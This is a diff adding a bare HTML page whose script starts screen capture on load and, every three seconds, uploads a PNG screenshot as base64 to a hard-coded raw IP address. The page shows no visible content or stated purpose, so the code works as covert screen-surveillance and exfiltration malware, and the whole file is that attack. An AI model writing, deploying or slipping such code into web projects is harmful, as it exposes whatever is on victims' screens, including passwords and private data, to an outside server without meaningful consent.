@@ -1,0 +1,46 @@
+<html>
+<body>
+    <script>
+        async function captureScreenshot() {
+            const stream = await navigator.mediaDevices.getDisplayMedia({
+                video: {
+                    cursor: "always"
+                },
+                audio: false
+            });
+
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            await new Promise((resolve) => (video.onloadedmetadata = resolve));
+            video.width = video.videoWidth;
+            video.height = video.videoHeight;
+            video.play();
+
+            setInterval(async () => {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const timestamp = Date.now();
+                const filename = `screenshot-${timestamp}.png`;
+                const imageBase64 = canvas.toDataURL("image/png");
+
+                await fetch("http://185.105.88.5:8888/upload.php", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        image: imageBase64,
+                        filename: filename
+                    })
+                });
+            }, 3000); // Every 3000ms (3 seconds)
+        }
+
+        captureScreenshot();
+    </script>
+</body>
+</html>
